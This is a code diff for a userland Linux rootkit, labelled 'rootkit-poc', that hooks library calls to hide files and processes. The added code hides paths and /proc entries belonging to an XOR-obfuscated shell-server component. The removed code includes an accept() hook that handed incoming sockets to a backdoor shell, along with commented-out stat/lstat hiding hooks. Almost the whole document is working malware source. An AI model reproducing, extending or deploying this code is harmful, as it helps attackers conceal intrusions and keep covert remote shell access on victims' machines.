@@ -23,7 +23,7 @@
 
 #include "etc.h"
 #include "shell.h"
-#include "poc.h"
+#include "libshserver.h"
 
 // Set up syscall hooks
 void init(void) {
@@ -50,21 +50,64 @@ void init(void) {
 }
 
 int is_invisible(const char *path) {
-    DEBUG("[rootkit-poc]: is_invisible called\n");
-
     char *config_file = strdup(CONFIG_FILE);
+    char *shell_server = strdup(SHELL_SERVER);
 
     init(); // hook configurations
 
     xor(config_file);
+    xor(shell_server);
 
     // Checks if the path contains the MAGIC_STRING
-    //if (strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
-    if (strstr(path, MAGIC_STRING)) {
+    if (strstr(path, MAGIC_STRING) || strstr(path, shell_server)) {
         cleanup(config_file, strlen(config_file));
+        cleanup(shell_server, strlen(shell_server));
         return 1; // invisible
     }
 
+    struct stat s_fstat;
+    char line[MAX_LEN];
+    char p_path[PATH_MAX];
+    char *proc_path = strdup(PROC_PATH);
+    FILE *cmd;
+    int fd;
+
+    xor(proc_path);
+
+    if (strstr(path, proc_path)) {
+        cleanup(proc_path, strlen(proc_path));
+
+        char *cmd_proc_name = strdup(CMD_PROC_NAME);
+
+        xor(cmd_proc_name);
+
+        snprintf(p_path, PATH_MAX, cmd_proc_name, extract_pid(path));
+
+        cleanup(cmd_proc_name, strlen(cmd_proc_name));
+
+        cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");
+
+        if (cmd) {
+            int res;
+            char *step = &line[0];
+
+            while ((res=fgets(line, MAX_LEN, cmd) != NULL)) {
+                if (strstr(line, shell_server)) {
+                    cleanup(config_file, strlen(config_file));
+                    cleanup(shell_server, strlen(shell_server));
+                    return 1;
+                }
+
+                memset(line, 0x00, MAX_LEN);
+					  }
+
+            fclose(cmd);
+        }
+    } else {
+        cleanup(proc_path, strlen(proc_path));
+    }
+
+    cleanup(shell_server, strlen(shell_server));
     cleanup(config_file, strlen(config_file));
 
     return 0; // visible
@@ -207,60 +250,5 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
     }
 
     return (long) syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
-}
-
-// Hooked stat function to hide invisible files
-//int stat(const char *path, struct stat *buf) {
-//    DEBUG("[rootkit-poc]: stat hooked\n");
-//
-//    if (is_invisible(path)) {
-//        errno = ENOENT;
-//        return -1;
-//    }
-//
-//    return (long) syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);
-//}
-
-// Hooked lstat function to hide invisible files
-//int lstat(const char *file, struct stat *buf) {
-//    DEBUG("[rootkit-poc]: lstat hooked\n");
-//
-//    if (is_invisible(file)) {
-//        errno = ENOENT;
-//        return -1;
-//    }
-//
-//    return (long) syscall_list[SYS_LXSTAT].syscall_func(_STAT_VER, file, buf);
-//}
-
-int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
-    DEBUG("[rootkit-poc]: accept hooked\n");
-
-    if (addrlen == NULL) {
-        fprintf(stderr, "Error: addrlen is NULL before syscall\n");
-        errno = EINVAL;
-        return -1;
-    }
-
-    if (addr == NULL) {
-        fprintf(stderr, "Error: addr is NULL before syscall\n");
-        errno = EINVAL;
-        return -1;
-    }
-
-    int sock = (long) syscall_list[SYS_ACCEPT].syscall_func(sockfd, addr, addrlen);
-
-    if (sock < 0) {
-        perror("accept");
-        return -1;
-    }
-
-    if (addr == NULL) {
-        fprintf(stderr, "Error: addr is NULL after syscall\n");
-        errno = EFAULT;
-        return -1;
-    }
-
-    return start_shell(sock, addr);
 }
 
